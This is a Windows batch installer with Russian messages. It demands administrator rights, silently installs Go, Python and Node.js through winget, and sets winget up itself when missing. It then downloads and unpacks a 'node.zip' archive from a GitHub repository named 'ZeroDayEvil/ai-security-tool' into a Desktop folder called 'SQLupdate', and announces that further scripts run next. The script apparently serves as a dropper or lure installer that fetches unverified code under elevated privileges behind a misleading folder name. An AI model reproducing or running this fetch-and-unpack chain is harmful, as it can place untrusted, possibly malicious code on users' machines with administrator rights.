@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

echo ========================================================
echo Автоматическая установка (Режим Администратора)
echo ========================================================
echo.

net session >nul 2>&1
if errorlevel 1 (
  echo [!] Запустите этот BAT от имени администратора.
  pause
  exit /b 1
)

call :EnsureWinget
if errorlevel 1 (
  echo [!] WinGet недоступен. Установка прервана.
  pause
  exit /b 1
)

echo [*] Установка Go...
winget install -e --id GoLang.Go --silent --accept-package-agreements --accept-source-agreements
if errorlevel 1 echo [!] Ошибка установки Go.

echo [*] Установка Python...
winget install -e --id Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
if errorlevel 1 echo [!] Ошибка установки Python.

echo [*] Установка Node.js...
winget install -e --id OpenJS.NodeJS.LTS --silent --accept-package-agreements --accept-source-agreements
if errorlevel 1 echo [!] Ошибка установки Node.js.

set "TARGET_DIR=%USERPROFILE%\Desktop\SQLupdate"
set "ZIP_FILE=%TARGET_DIR%\node.zip"
set "DOWNLOAD_URL=https://raw.githubusercontent.com/ZeroDayEvil/ai-security-tool/main/data/node.zip"

echo.
echo [*] Создание папки...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo [*] Загрузка архива...
curl -L "%DOWNLOAD_URL%" -o "%ZIP_FILE%"
if errorlevel 1 (
  echo [!] Не удалось скачать архив.
  pause
  exit /b 1
)

echo [*] Распаковка архива...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath '%TARGET_DIR%' -Force"
if errorlevel 1 (
  echo [!] Не удалось распаковать архив.
  pause
  exit /b 1
)

echo [*] Очистка...
if exist "%ZIP_FILE%" del /q "%ZIP_FILE%"

echo.
echo ========================================================
echo Базовая установка завершена!
echo Переход к выполнению дополнительных скриптов...
echo ========================================================
pause
exit /b 0

:EnsureWinget
set "PATH=%LOCALAPPDATA%\Microsoft\WindowsApps;%PATH%"

winget --version >nul 2>&1
if not errorlevel 1 (
  echo [+] WinGet уже работает.
  winget --version
  exit /b 0
)

echo [*] WinGet не найден или без лицензии. Настройка...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-Content -LiteralPath $env:TEMP\ensure-winget.ps1 -Encoding UTF8 -Value @'
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$d = Join-Path $env:TEMP 'wingetfix'
New-Item $d -ItemType Directory -Force | Out-Null
$b = 'https://github.com/microsoft/winget-cli/releases/download/v1.29.290'
Invoke-WebRequest ($b + '/DesktopAppInstaller_Dependencies.zip') -OutFile (Join-Path $d 'deps.zip')
Invoke-WebRequest ($b + '/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle') -OutFile (Join-Path $d 'app.msixbundle')
Invoke-WebRequest ($b + '/e53e159d00e04f729cc2180cffd1c02e_License1.xml') -OutFile (Join-Path $d 'license.xml')
Expand-Archive (Join-Path $d 'deps.zip') (Join-Path $d 'deps') -Force
$arch = if ([Environment]::Is64BitOperatingSystem) { 'x64' } else { 'x86' }
Get-ChildItem (Join-Path $d ('deps\' + $arch)) -Filter '*.appx' | Where-Object { $_.Name -notmatch 'WindowsAppRuntime' } | ForEach-Object { Add-AppxPackage $_.FullName -ForceUpdateFromAnyVersion -ErrorAction SilentlyContinue }
Get-AppxPackage Microsoft.DesktopAppInstaller -ErrorAction SilentlyContinue | Remove-AppxPackage -ErrorAction SilentlyContinue
Add-AppxProvisionedPackage -Online -PackagePath (Join-Path $d 'app.msixbundle') -LicensePath (Join-Path $d 'license.xml') | Out-Null
Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
'@"
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\ensure-winget.ps1"
del /q "%TEMP%\ensure-winget.ps1" >nul 2>&1

set "PATH=%LOCALAPPDATA%\Microsoft\WindowsApps;%PATH%"
winget --version >nul 2>&1
if errorlevel 1 (
  echo [!] Не удалось настроить WinGet.
  exit /b 1
)

echo [+] WinGet установлен.
winget --version
exit /b 0
